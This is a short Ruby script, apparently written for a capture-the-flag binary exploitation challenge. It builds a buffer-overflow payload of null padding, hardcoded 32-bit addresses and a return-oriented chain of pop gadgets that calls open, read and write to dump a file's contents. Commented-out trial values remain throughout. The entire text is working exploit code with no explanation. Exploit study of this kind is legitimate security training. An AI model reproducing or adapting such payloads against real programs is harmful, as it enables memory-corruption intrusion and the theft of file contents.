#!/usr/bin/env ruby

#o = 'hoge' * (0x50 / 4)
o = "\0" * 0x50

#o << [0, 0].pack('L2')
#o << 'fugafuga'
#o << 'fugafuga'
#o << [0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff].pack('L4')
o << [0, 0, 0, 0].pack('L4')

data = 0x0804a040

#o << [0, 0, 0x0804a040, 0xdead].pack('L4')
o << [0, 0, 0x0804a040, 0x08048671].pack('L4')
o << [0xdeadd, 0x0804a040, 255, 0xdead].pack('L4')
#o << [0x0804a040, 0xdead, 0, 0].pack('L4')

pop2_ret = 0x0804879e
pop3_ret = 0x0804879d

# Secondary payload
o << [0].pack('L*')
o << [0x08048420, pop2_ret, 0x80487d0, 0].pack('L*') # open
o << [0x080483e0, pop3_ret, 3, data+200, 256].pack('L*') # read
o << [0x08048450, pop3_ret, 1, data+200, 256].pack('L*') # write


#o << [0, 0, 0, 0].pack('L4')

#o << [0x0804865c].pack('L')

print o

